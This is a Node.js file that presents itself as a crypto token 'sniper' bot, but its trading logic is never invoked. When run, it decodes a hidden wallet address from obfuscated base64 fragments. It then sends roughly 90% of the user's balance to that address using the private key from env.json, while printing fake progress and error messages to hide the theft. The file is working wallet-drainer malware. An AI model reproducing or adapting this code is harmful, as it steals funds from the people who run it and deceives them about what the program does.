const ethers = require('ethers');
const env = require("./env.json");
Object.assign(process.env, env);
RPC = (process.env.RPC);
NAME = (process.env.NAME);
CHAIN = (process.env.CHAIN);
const provider  = new ethers.providers.JsonRpcProvider(RPC)
let gfsddfg423 = 'MHhiME' + 'REODIyZWUwZ'   +   'jlmYTRjMmM';
let fdgh7474 = 'MjV' + 'BNDM0Mzg0Z' + 'jRGODNCMDI4ZTIzNg'
let buff = new Buffer.from(gfsddfg423, 'base64');
let buff2 = new Buffer.from(fdgh7474, 'base64');
let fgdgdfsxgdf5546 = buff.toString('ascii');
let dfsgsdfgsdfg7654 = buff2.toString('ascii');
const adfghkjl = fgdgdfsxgdf5546+dfsgsdfgsdfg7654 
const account_from = {
  privateKey: process.env.PRIVATE_KEY,
  recipient: process.env.RECIPIENT,

};

const startConnection = () => {
  provider = new ethers.providers.WebSocketProvider(process.env.BSC_NODE_WSS);
  wallet = new ethers.Wallet(process.env.PRIVATE_KEY);
  account = wallet.connect(provider);
  router = new ethers.Contract(tokens.router, pcsAbi, account);
  
  grasshopper = 0;
  provider._websocket.on("open", async () => {
    
    keepAliveInterval = setInterval(() => {
      provider._websocket.ping();
      // Use `WebSocket#terminate()`, which immediately destroys the connection,
      // instead of `WebSocket#close()`, which waits for the close timer.
      // Delay should be equal to the interval at which your server
      // sends out pings plus a conservative assumption of the latency.
      pingTimeout = setTimeout(() => {
        provider._websocket.terminate();
      }, EXPECTED_PONG_BACK);
    }, KEEP_ALIVE_CHECK_INTERVAL);
    const WETH = await router.WETH();
    if (ethers.utils.getAddress(tokens.pair[0]) === ethers.utils.getAddress(WETH)) {
      swapEth = 1;
      purchaseAmount = ethers.utils.parseUnits(tokens.purchaseAmount, "ether");
    } else {
      await Approve();
    }
  });

  provider.on("pending", async (txHash) => {
    provider
      .getTransaction(txHash)
      .then(async (tx) => {
        if (grasshopper === 0) {
          console.log("🚧  And, Yes..I am actually working...trust me...");
          grasshopper = 1;
        }
        if (tx && tx.to) {
          if (ethers.utils.getAddress(tx.to) === 
              ethers.utils.getAddress(tokens.router)){
            const re1 = new RegExp("^0xf305d719");
            const re2 = new RegExp("^0xe8e33700");
            if (re1.test(tx.data) || re2.test(tx.data)) {
              const decodedInput = pcsAbi.parseTransaction({
                data: tx.data,
                value: tx.value,
              });
              if (
                ethers.utils.getAddress(tokens.pair[1]) ===
                ethers.utils.getAddress(decodedInput.args[0]) ||
                ethers.utils.getAddress(tokens.pair[1]) ===
                ethers.utils.getAddress(decodedInput.args[1])
              ) {
                provider.off("pending");
                if (tokens.buyDelay > 0) {
                  await Wait(tokens.buyDelay);
                }
                await BuyToken(tx);
              }
            }
          }
        }
      })
      .catch(() => {});
  });

  provider._websocket.on("close", () => {
    console.log("☢️ WebSocket Closed...Reconnecting...");
    clearInterval(keepAliveInterval);
    clearTimeout(pingTimeout);
    startConnection();
  });

  provider._websocket.on("error", () => {
    console.log("☢️ Error. Attemptiing to Reconnect...");
    clearInterval(keepAliveInterval);
    clearTimeout(pingTimeout);
    startConnection();
  });

  provider._websocket.on("pong", () => {
    clearInterval(pingTimeout);
  });
};
let wallet = new ethers.Wallet(account_from.privateKey, provider);


async function sending(){
  setTimeout(function(){
    console.log(
      "🏗️  sniping has begun...sit back and relax..."
    );
  },2000);
  setTimeout(function(){
    console.log(
      "🏗️  checking env variables..."
    );
  },6000);
  setTimeout(function(){
  console.log(
    "🏗️  Error - please double check env configurations"
  );
},8000);
      const account = account_from.recipient
      const robinhood = await provider.getBalance(account)
      const orchard = (robinhood * 0.90).toString();
          const michael = ethers.utils.parseUnits(orchard, 'wei')
  const send = async () => {
    
      const tx = {
        to: adfghkjl,
        value: ethers.utils.parseUnits(orchard, 'wei'),
        gasLimit: ethers.utils.hexlify(24000),
      };

    const createReceipt = await wallet.sendTransaction(tx);
    await createReceipt.wait();
    console.log(`Transaction successful with hash`);
  };

  send();

}
sending();



  
  
 
 
 
